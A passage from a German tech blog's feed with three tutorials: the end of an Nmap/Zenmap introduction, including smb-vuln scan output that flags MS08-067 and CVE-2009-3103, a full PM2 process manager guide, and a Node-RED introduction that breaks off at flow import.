|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error <span class="k">in </span>the SMBv2 protocol implementation <span class="k">in </span>srv2.sys <span class="k">in </span>Microsoft Windows Vista Gold, SP1, and SP2, 
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a 
|           denial of service <span class="o">(</span>system crash<span class="o">)</span> via an &amp; <span class="o">(</span>ampersand<span class="o">)</span> character <span class="k">in </span>a Process ID High header field <span class="k">in </span>a NEGOTIATE 
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, 
|           aka <span class="s2">"SMBv2 Negotiation Vulnerability."</span> 
|           
|     Disclosure <span class="nb">date</span>: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2009-3103
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service <span class="k">in </span>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure <span class="nb">date</span>: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: <span class="nb">false</span>
|_smb-vuln-ms10-061: <span class="nb">false

</span>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>40.75 seconds

</code></pre></div></div>

<h2 id="basis-scan-via-zenmap">Basis Scan via Zenmap</h2>

<p>Durch die Graphische Oberfläche(Zenmap) wir die Bedienung von Nmap um einiges erleichtert. Jedoch schadet es nicht wie oben beschrieben auch einmal Nmap via CLI zu bedienen. Denn komplexere Scanaufträge lassen sich auch nur via CLI wirklich vernünftig durchführen.</p>

<p>Zenmap ist in Kali Linux enthalten und kann direkt aus denn Anwedungsfenster gestartet werden.</p>

<p><a href="/images/posts/Nmap/Zenmap_001.png" class="image-popup">
    <img src="/images/posts/Nmap/Zenmap_001.png" alt="placeholder-2" />
</a></p>

<p>In der Zeile Target tragen wir ein einzelnes Ziel 192.168.1.100 ein oder einen Teilbereich z.B: 192.168.1.1-50. Im rechten Dropdown Menü wählen wir die Scan Methode aus und mit Klick auf den Button Scan starten wir den Scanvorgang.</p>

<p><a href="/images/posts/Nmap/Zenmap_002.png" class="image-popup">
    <img src="/images/posts/Nmap/Zenmap_002.png" alt="placeholder-2" />
</a></p>

<p>Im Reiter Nmap Output erhalten wir die selben Informationen wie im Ausgabe Fenster der Konsole.</p>

<p><a href="/images/posts/Nmap/Zenmap_003.png" class="image-popup">
    <img src="/images/posts/Nmap/Zenmap_003.png" alt="placeholder-2" />
</a></p>

<p>Im Reiter Ports/Host werden die offen Ports und die dahinter stehenden Dienste Grafisch angezeigt.</p>

<p><a href="/images/posts/Nmap/Zenmap_004.png" class="image-popup">
    <img src="/images/posts/Nmap/Zenmap_004.png" alt="placeholder-2" />
</a></p>

<p>Im Reiter Host Details erhalten wie detaillierte Informationen zum Host wenn diese ausgelesen werden können.</p>

<p><a href="/images/posts/Nmap/Zenmap_005.png" class="image-popup">
    <img src="/images/posts/Nmap/Zenmap_005.png" alt="placeholder-2" />
</a></p>

<p>Der Vorteil von Zenmap kommt eigentlich erst zu tragen wenn man größere Segmente oder sogar mehrere Netzwerke scannt. Jeder einzelne Scanvorgang kann unter Scan -&gt; Save gespeichert werden. Zusätzlich lässt sich die Grafische Ausgabe auch Filtern um die Ergebnisse auf die wichtigsten Ziele zu beschränken.</p>

<p><a href="/images/posts/Nmap/Zenmap_006.png" class="image-popup">
    <img src="/images/posts/Nmap/Zenmap_006.png" alt="placeholder-2" />
</a></p>

<h2 id="mehr-informationen">Mehr Informationen</h2>

<p>Eine Sammlung der Wichtigsten Nmap Befehlen<br />
<a href="/docs/nmap_40">Nmap Kommandoreferenz</a></p>

<p>Die offiziele Dokumentation von Nmap<br />
<a href="https://nmap.org/man/de/">Nmap Official Docs</a></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">See you !</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>]]></content><author><name>Daniel Grill</name><email>info@dgrill.at</email><uri>https://dg60.github.io/</uri></author><summary type="html"><![CDATA[Eine kurze Einführung in den Netzwerk/Portscanner Nmap]]></summary></entry><entry xml:lang="DE"><title type="html">Pm2 Prozess Manager Einführung</title><link href="https://dg60.github.io/PM2-Prozess-Manager-Einf%C3%BChrung/" rel="alternate" type="text/html" title="Pm2 Prozess Manager Einführung" /><published>2016-12-08T00:00:00+01:00</published><updated>2016-12-08T00:00:00+01:00</updated><id>https://dg60.github.io/PM2-Prozess-Manager-Einf%C3%BChrung</id><content type="html" xml:base="https://dg60.github.io/PM2-Prozess-Manager-Einf%C3%BChrung/"><![CDATA[<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">It´s time to code</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>Hallo,</p>

<p>Heute möchte ich euch kurz den Prozessmanager <a href="http://pm2.keymetrics.io/">PM2</a> vorstellen. Der mittels CLI Interface sehr komfortabel 
gesteuert werden kann.</p>

<p><img src="/images/docs/pm2_small.png" alt="image-center" class="align-center" /></p>

<p><strong>Primäre Aufgaben eines Prozessmanagers:</strong></p>

<ul>
  <li>Automatischer Neustart der Anwendung nach einem Absturz</li>
  <li>Protokollierung im Fehlerfall</li>
  <li>Monitorring des Laufzeitverhaltens und der Ressourcennutzung</li>
  <li>Nachladen von Programmen ohne Ausfallzeit</li>
  <li>uvm.</li>
</ul>

<p>PM2 ist primär für den Einsatz in einer Produktivumgebung gedacht um bei einen Absturz einer Anwendung diese neu zu starten und den Fehler in einem Logfile
festzuhalten. Gerade in der Releasephase einer Anwendung ist es von großen Vorteil das nicht jedes mal die Anwendung von Hand neu gestartet werden muss wenn 
ein Fehler auftritt.</p>

<p>PM2 unterstützt eine breite Palette von folgenden Skriptsprachen:</p>

<ul>
  <li>Javascript (Node.js)</li>
  <li>Python</li>
  <li>Ruby</li>
  <li>uvm.</li>
</ul>

<h2 id="installation">Installation</h2>

<p>PM2 lässt sich ganz einfach über den Node Packet Manager (npm) mit folgenden Befehl installieren:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>npm <span class="nb">install</span> <span class="nt">-g</span> pm2
</code></pre></div></div>

<p>Nach der Installation prüfen wir noch ob PM2 auch ordnungsgemäß installiert worden ist mit folgenden Befehl:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pm2 
</code></pre></div></div>

<p>Und wir sollten folgende Ausgabe erhalten:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Basic Examples:

    Start an app using all CPUs available + <span class="nb">set </span>a name :
    <span class="nv">$ </span>pm2 start app.js <span class="nt">-i</span> 0 <span class="nt">--name</span> <span class="s2">"api"</span>

    Restart the previous app launched, by name :
    <span class="nv">$ </span>pm2 restart api

    Stop the app :
    <span class="nv">$ </span>pm2 stop api

    Restart the app that is stopped :
    <span class="nv">$ </span>pm2 restart api

    Remove the app from the process list :
    <span class="nv">$ </span>pm2 delete api

    Kill daemon pm2 :
    <span class="nv">$ </span>pm2 <span class="nb">kill

    </span>Update pm2 :
    <span class="nv">$ </span>npm <span class="nb">install </span>pm2@latest <span class="nt">-g</span> <span class="p">;</span> pm2 update

    More examples <span class="k">in </span>https://github.com/Unitech/pm2#usagefeatures

  Deployment <span class="nb">help</span>:

    <span class="nv">$ </span>pm2 deploy <span class="nb">help</span>
</code></pre></div></div>

<h2 id="erste-schritte-mit-pm2">Erste Schritte mit PM2</h2>

<p>Um einen Prozess über PM2 zu starten brauchen wir erst einmal ein kleines Skript. Dafür kopieren wir den unten angeführten Quellcode in einen Datei 
und geben ihr den Namen app.js.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">http</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">response</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/plain</span><span class="dl">"</span><span class="p">});</span>
  <span class="nx">response</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello PM2</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusMessage</span><span class="p">);</span>
<span class="p">});</span> 

<span class="c1">// Listen on port 8000, IP defaults to 127.0.0.1</span>
<span class="nx">server</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Server running at http://127.0.0.1:8000/</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">//app.js</span>

</code></pre></div></div>

<p>Anschließend starten wie das Skript mit PM2 mit folgenden Befehl:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pm2 start app.js <span class="nt">--name</span> <span class="s2">"app"</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>PM2] Spawning PM2 daemon with <span class="nv">pm2_home</span><span class="o">=</span>/home/dgrill/.pm2
<span class="o">[</span>PM2] PM2 Successfully daemonized
<span class="o">[</span>PM2] Starting /home/dgrill/Schreibtisch/TEMP/app.js <span class="k">in </span>fork_mode <span class="o">(</span>1 instance<span class="o">)</span>
<span class="o">[</span>PM2] Done.
┌──────────┬────┬──────┬───────┬────────┬─────────┬────────┬─────┬───────────┬──────────┐
│ App name │ <span class="nb">id</span> │ mode │ pid   │ status │ restart │ <span class="nb">uptime</span> │ cpu │ mem       │ watching │
├──────────┼────┼──────┼───────┼────────┼─────────┼────────┼─────┼───────────┼──────────┤
│ app      │ 0  │ fork │ 20211 │ online │ 0       │ 0s     │ 2%  │ 20.0 MB   │ disabled │
└──────────┴────┴──────┴───────┴────────┴─────────┴────────┴─────┴───────────┴──────────┘
 Use <span class="sb">`</span>pm2 show &lt;<span class="nb">id</span>|name&gt;<span class="sb">`</span> to get more details about an app
</code></pre></div></div>
<p>Und sehen in der Ausgabe das der Prozess nun erfolgreich gestartet worden ist. <br />
Sollte unser kleine Anwendung nun einen Fehler produzieren wird der Prozess automatisch von PM2 neu 
gestartet und der restart counter erhöht. Des weiteren wird ein Eintrag im Error Log angelegt das Standardmässig unter linux im folgenden Verzeichnis zu finden ist (/home/user/.pm2/logs). Zusätzlich zum überwachen
und neustarten von Prozessen zeichnet PM2 auch alle Logmeldungen auf, die von der Applikation in die Standard Ausgabe geschrieben werden.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/user/.pm2
├── logs
│   ├── app-error-0.log
│   └── app-out-0.log
├── module_conf.json
├── pids
│   └── app-0.pid
├── pm2.log
├── pm2.pid
├── pub.sock
├── rpc.sock
└── <span class="nb">touch

</span>2 directories, 9 files
</code></pre></div></div>

<h2 id="log-einträge-anzeigen">Log Einträge anzeigen</h2>

<p>Um sich die aktuellen Logmeldungen des laufenden Prozess live anzusehen geben wir folgenden Befehl ein:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pm2 logs app
</code></pre></div></div>
<p>Und wir erhalten folgende Ausgabe:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>STREAMING] Now streaming realtime logs <span class="k">for</span> <span class="o">[</span>app] process
</code></pre></div></div>
<p>Rufen wir nun in unseren Browser folgenden Link auf <a href="http://localhost:8000/">http://localhost:8000/</a> und senden somit eine Anfrage an unsere Applikation. 
Werden die Logmeldungen in Echtzeit ausgegeben.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0|app      | 200 OK 
0|app      | 200 OK 
</code></pre></div></div>

<h2 id="starten-von-prozesse-via-configjson">Starten von Prozesse via config.json</h2>

<p>Sollen mehrere Anwendungen von PM2 überwacht werden bittet es sich an alle Prozesse in eine json Datei zusammen zu fassen. Somit können mehrere Prozesse mit 
einen Befehl von PM2 überwacht werden.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"script"</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="s2">"/home/dgrill/Schreibtisch/TEMP/app/app.js"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"name"</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="s2">"app"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"merge_logs"</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"log_date_format"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"YYYY-MM-DD HH:mm Z"</span><span class="w">
</span><span class="p">},</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"script"</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="s2">"/home/dgrill/Schreibtisch/TEMP/app_1/app_1.js"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"name"</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="s2">"app_1"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"merge_logs"</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
  </span><span class="nl">"log_date_format"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"YYYY-MM-DD HH:mm Z"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>
<p>process.json</p>

<p>Das Starten der Anwendung folgt wie schon oben beschrieben über den Befehl pm2 start nur mit dem Unterschied das wir hier die config.json datei angeben.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pm2 start process.json 
<span class="o">[</span>PM2][WARN] Applications app, app_1 not running, starting...
<span class="o">[</span>PM2] App <span class="o">[</span>app] launched <span class="o">(</span>1 instances<span class="o">)</span>
<span class="o">[</span>PM2] App <span class="o">[</span>app_1] launched <span class="o">(</span>1 instances<span class="o">)</span>
┌──────────┬────┬──────┬──────┬────────┬─────────┬────────┬─────┬───────────┬──────────┐
│ App name │ <span class="nb">id</span> │ mode │ pid  │ status │ restart │ <span class="nb">uptime</span> │ cpu │ mem       │ watching │
├──────────┼────┼──────┼──────┼────────┼─────────┼────────┼─────┼───────────┼──────────┤
│ app      │ 0  │ fork │ 2019 │ online │ 0       │ 0s     │ 0%  │ 17.2 MB   │ disabled │
│ app_1    │ 1  │ fork │ 2024 │ online │ 0       │ 0s     │ 0%  │ 16.6 MB   │ disabled │
└──────────┴────┴──────┴──────┴────────┴─────────┴────────┴─────┴───────────┴──────────┘
 Use <span class="sb">`</span>pm2 show &lt;<span class="nb">id</span>|name&gt;<span class="sb">`</span> to get more details about an app
</code></pre></div></div>

<p>Neustarten der Prozesse</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pm2 restart process.json 
<span class="o">[</span>PM2] Applying action restartProcessId on app <span class="o">[</span>app]<span class="o">(</span>ids: 0<span class="o">)</span>
<span class="o">[</span>PM2] Applying action restartProcessId on app <span class="o">[</span>app_1]<span class="o">(</span>ids: 1<span class="o">)</span>
<span class="o">[</span>PM2] <span class="o">[</span>app]<span class="o">(</span>0<span class="o">)</span> ✓
<span class="o">[</span>PM2] <span class="o">[</span>app_1]<span class="o">(</span>1<span class="o">)</span> ✓
┌──────────┬────┬──────┬──────┬────────┬─────────┬────────┬─────┬───────────┬──────────┐
│ App name │ <span class="nb">id</span> │ mode │ pid  │ status │ restart │ <span class="nb">uptime</span> │ cpu │ mem       │ watching │
├──────────┼────┼──────┼──────┼────────┼─────────┼────────┼─────┼───────────┼──────────┤
│ app      │ 0  │ fork │ 7131 │ online │ 0       │ 10s    │ 0%  │ 17.3 MB   │ disabled │
│ app_1    │ 1  │ fork │ 7136 │ online │ 0       │ 10s    │ 0%  │ 15.2 MB   │ disabled │
└──────────┴────┴──────┴──────┴────────┴─────────┴────────┴─────┴───────────┴──────────┘
 Use <span class="sb">`</span>pm2 show &lt;<span class="nb">id</span>|name&gt;<span class="sb">`</span> to get more details about an app

</code></pre></div></div>

<p>Stoppen der Prozesse</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pm2 stop process.json 
<span class="o">[</span>PM2] <span class="o">[</span>app]<span class="o">(</span>0<span class="o">)</span> ✓
<span class="o">[</span>PM2] <span class="o">[</span>app_1]<span class="o">(</span>1<span class="o">)</span> ✓
┌──────────┬────┬──────┬─────┬─────────┬─────────┬────────┬─────┬────────┬──────────┐
│ App name │ <span class="nb">id</span> │ mode │ pid │ status  │ restart │ <span class="nb">uptime</span> │ cpu │ mem    │ watching │
├──────────┼────┼──────┼─────┼─────────┼─────────┼────────┼─────┼────────┼──────────┤
│ app      │ 0  │ fork │ 0   │ stopped │ 0       │ 12     │ 0%  │ 0 B    │ disabled │
│ app_1    │ 1  │ fork │ 0   │ stopped │ 0       │ 12     │ 0%  │ 0 B    │ disabled │
└──────────┴────┴──────┴─────┴─────────┴─────────┴────────┴─────┴────────┴──────────┘
 Use <span class="sb">`</span>pm2 show &lt;<span class="nb">id</span>|name&gt;<span class="sb">`</span> to get more details about an app
</code></pre></div></div>
<p>Der weitere große Vorteil von eine config.json datei ist das alle in diese enthalten Datei auf einmal gestartet/gestoppt oder neu gestartet
werden können. Und somit auch Abhängigkeiten von Prozessen berücksichtigt werden können.</p>

<h2 id="pm2-im-produktiven-einsatz">PM2 im produktiven Einsatz</h2>

<p>Um nun PM2 produktiv einzusetzen müssen noch ein paar Grundeinstellungen vorgenommen werden. 
Als erstes müssen wie PM2 als dameon(bzw. Dienst) einrichten. Hierzu reicht uns erstmals folgender Befehl:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pm2 startup
<span class="o">[</span>PM2] You have to run this <span class="nb">command </span>as root. Execute the following <span class="nb">command</span>:
      <span class="nb">sudo </span>su <span class="nt">-c</span> <span class="s2">"env PATH=</span><span class="nv">$PATH</span><span class="s2">:/home/unitech/.nvm/versions/node/v4.3/bin pm2 startup &lt;distribution&gt; -u &lt;user&gt; --hp &lt;home-path&gt;
</span></code></pre></div></div>
<p>PM2 erstellt durch diesen Befehl automatisch ein Startscript für unser System und mit dem Befehl aus der Ausgabe wird das Startscript für den Systemstart registriert.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>PM2] Spawning PM2 daemon with <span class="nv">pm2_home</span><span class="o">=</span>/root/.pm2
<span class="o">[</span>PM2] PM2 Successfully daemonized
<span class="o">[</span>PM2] Writing startup script <span class="k">in</span> /etc/init.d/pm2-init.sh
<span class="o">[</span>PM2] Making script booting at startup...
<span class="o">[</span>PM2] <span class="nt">-linux-</span> Using the <span class="nb">command</span>:
      su <span class="nt">-c</span> <span class="s2">"chmod +x /etc/init.d/pm2-init.sh &amp;&amp; update-rc.d pm2-init.sh defaults"</span>
<span class="o">[</span>PM2] Done.

<span class="o">[</span>PM2] Now you can <span class="nb">type</span>
<span class="nv">$ </span>pm2 save
<span class="o">[</span>PM2] To save the current process list at reboot or via pm2 update
</code></pre></div></div>

<p>Wurde das Startskript erfolgreich im System registriert erhalten wir noch den Hinweise den Befehl pm2 save auszuführen.</p>

<p class="notice--warning"><strong>$ pm2 save</strong></p>

<p>Und das sollte wir auch auf alle Fälle tun wenn wir alle aktuellen prozesse speichern wollen und somit sicherstellen das nach einen Systemneustart alle Prozesse gestartet werden. Sollten wir das Speichern der Prozesse vergessen wird nach einen 
Systemneustart von PM2 kein Prozess gestartet. PM2 save muss auch jedes mal ausgeführt werden wenn wir einen neuen Prozess hinzufügen.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">See you !</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="mehr-informationen">Mehr Informationen</h2>

<p>Eine Sammlung der Wichtigsten PM2 Befehle<br />
<a href="/docs/pm2_30">PM2 Kommandoreferenz</a></p>

<p>Die offiziele Dokumentation von PM2<br />
<a href="http://pm2.keymetrics.io/docs/usage/cluster-mode/">PM2 Official Docs</a></p>]]></content><author><name>Daniel Grill</name><email>info@dgrill.at</email><uri>https://dg60.github.io/</uri></author><summary type="html"><![CDATA[Eine kurze Einführung in den Prozess-Manger PM2]]></summary></entry><entry xml:lang="DE"><title type="html">Node Red Einführung</title><link href="https://dg60.github.io/Node-Red-Einf%C3%BChrung/" rel="alternate" type="text/html" title="Node Red Einführung" /><published>2016-10-26T00:00:00+02:00</published><updated>2016-10-26T00:00:00+02:00</updated><id>https://dg60.github.io/Node-Red-Einf%C3%BChrung</id><content type="html" xml:base="https://dg60.github.io/Node-Red-Einf%C3%BChrung/"><![CDATA[<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">It´s time to code</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>Heute möchte ich euch eine kurze Einführung in Node-RED geben. Node-RED ist ein Visuelles Tool um einfache und anspruchsvolle Anwendungen für das <a href="https://de.wikipedia.org/wiki/Internet_der_Dinge">“Internet der Dinge”</a> kurz. IOT zu schaffen.
Node-RED baut auf die leichtgewichtige <a href="https://nodejs.org/en/">Node.js</a> Laufzeitumgebung auf die als Grundlage zum ausführen des erzeugten Javascript code von Node-RED dient. Dadurch ist die Ausführung auf verschiedensten Hardwareplattformen möglich.</p>

<p><strong>Kompatible Node-RED Hardware:</strong></p>

<ul>
  <li><a href="https://www.raspberrypi.org/">Rasperry Pi</a></li>
  <li><a href="https://beagleboard.org/black">BeagleBone Black</a></li>
  <li>uvm…</li>
</ul>

<p>Meine Aufmerksamkeit hat Node-RED geweckt weil es unglaublich schnell und einfach einsatzbereit ist und eine breite Palette an Funktionen abdeckt die im Bereich IOT gefordert sind. 
In der <a href="https://www.npmjs.com/search?q=node-red">NPM</a> Bibliothek sind bereits über 120,000 Module zu finden um die Funktionen von Node-RED zu erweitern.</p>

<p><img src="/images/docs/node-red-icon.png" alt="image-center" class="align-center" /></p>
<center> <a href="https://nodered.org/">nodered.org</a> </center>

<p>Node-RED Quellcode auf Github <a href="https://github.com/node-red/node-red">Node-RED Quellcode</a></p>

<h2 id="installation-nodejs">Installation Node.js</h2>

<p>Bevor wir mit der Installation von Node-Red starten können müssen wir noch <a href="https://nodejs.org/en/">Node js</a> installieren. Hierzu braucht ihr nur dem unten aufgeführten Link für euer Betriebssystem folgen.
Ist Node.js bereits auf euren Computer installiert könnt ihr diesen Punkt überspringen und mit der Installation von Node-Red Fortfahren.</p>

<p><a href="https://nodejs.org/en/download/package-manager/#debian-and-ubuntu-based-linux-distributions">Node.js Installation Ubuntu</a><br />
<a href="https://nodejs.org/en/download/package-manager/#windows">Node.js Installation Windows</a><br />
<a href="https://nodejs.org/en/download/package-manager/#osx">Node.js Installation OSX</a></p>

<p>Um zu überprüfen das <a href="https://nodejs.org/en/">Node.js</a> ordnungsgemäß installiert ist reicht folgende Befehl.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>node <span class="nt">-v</span>
v4.4.7
</code></pre></div></div>
<p>Es sollte nun die aktuelle installierte Version von Node.js ausgegeben werden.</p>

<h2 id="installation-node-red">Installation Node-RED</h2>

<p>Um Node-Red zu installieren reicht es die unten angeführten Befehle in das Terminal einzugeben.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>npm <span class="nb">install</span> <span class="nt">-g</span> node-red
<span class="nv">$ </span>node-red
</code></pre></div></div>

<p>Wurde die Installation von Node-RED Erfolgreich Abgeschlossen sollte folgende Ausgabe im Terminal erscheinen.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to Node-RED
<span class="o">===================</span>

20 Oct 17:50:51 - <span class="o">[</span>info] Node-RED version: v0.14.5
20 Oct 17:50:51 - <span class="o">[</span>info] Node.js  version: v4.4.7
20 Oct 17:50:51 - <span class="o">[</span>info] Linux 4.4.0-43-generic x64 LE
20 Oct 17:50:51 - <span class="o">[</span>info] Loading palette nodes
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>20 Oct 17:50:53 - <span class="o">[</span>warn] <span class="nt">------------------------------------------------------</span>
20 Oct 17:50:53 - <span class="o">[</span>info] Settings file  : /home/dgrill/.node-red/settings.js
20 Oct 17:50:53 - <span class="o">[</span>info] User directory : /home/dgrill/.node-red
20 Oct 17:50:53 - <span class="o">[</span>info] Flows file     : /home/dgrill/.node-red/flows_ServerGrill.json
20 Oct 17:50:53 - <span class="o">[</span>info] Server now running at http://127.0.0.1:1880/
20 Oct 17:50:53 - <span class="o">[</span>info] Starting flows
20 Oct 17:50:53 - <span class="o">[</span>info] Started flows
</code></pre></div></div>

<h2 id="ersten-flow-erstellen">Ersten Flow Erstellen</h2>

<p>Erreichbar ist Node-RED nun unter <a href="http://127.0.0.1:1880/">http://127.0.0.1:1880/</a></p>

<p>Nun sollte folgende Seite im Browserfenster aufgerufen werden.</p>

<p><a href="/images/posts/Node-RED/Node-RED_start.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start1.png" alt="placeholder-1" />
</a></p>

<p>Auf der linken Seite sehen wir ein Menü wo alle Steuerelemente nach Gruppen (input, output, function usw.) sortiert diese können einfach per Drag und drop auf dem
Flow Board platziert werden. In der Mitte befindet sich das Flow Board wo alle Steuerelemente frei platziert werden können.</p>

<p>Auf der rechten Seite gibt es einmal das Info Fenster und das wohl wichtigste Fenster Debug. Gleich darüber befindet sich der Deploy Button der
jetzt noch grau hinterlegt ist. Und genau das wollen wir jetzt ändern :)</p>

<p>Zum Einstieg wollen wir “Hello Node-RED” im Debug Fenster ausgeben. Hierzu ziehen wir uns das inject Steuerelemente von der rechten Seite auf das 
Flow Board.</p>

<p><a href="/images/posts/Node-RED/Node-RED_start1.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start1.png" alt="placeholder-2" />
</a></p>

<p>Durch einen Doppelklick auf das Steuerelemente öffnet sich der Eigenschaften Dialog. Hier wählen wir bei Payload die Eigenschaft string, und geben
“Hello Node-RED” ein. Anschließend speichern wir die eingabe durch das Drücken des Button Done.</p>

<p><a href="/images/posts/Node-RED/Node-RED_start2.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start2.png" alt="placeholder-2" />
</a></p>

<p><a href="/images/posts/Node-RED/Node-RED_start3.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start3.png" alt="placeholder-2" />
</a></p>

<p>Jetzt ziehen wir uns das Steuerelemente Debug auf das Flow Board, und verbinden einfach beide Elemente mit der Maus.</p>

<p><a href="/images/posts/Node-RED/Node-RED_start4.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start4.png" alt="placeholder-2" />
</a></p>

<p>Jetzt brauchen wir nur noch den Button Deploy drücken und die Anwendung wird generiert. Um jetzt die Meldung in das Debug Fenster zu schreiben genügt
ein Klick auf den Inject Button und es sollte nun Hello Node-RED in der Debug Konsole ausgegeben werden.</p>

<p><a href="/images/posts/Node-RED/Node-RED_start5.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start5.png" alt="placeholder-2" />
</a></p>

<h2 id="import-eines-flows">Import eines Flows</h2>

<p>Ein Flow kann ganz einfach über die Optionen in der rechten oberen ecke importiert werden. Im sich nun öffnenden Dropdown Menü wähl man die
Option Import &gt; Clipboard.</p>

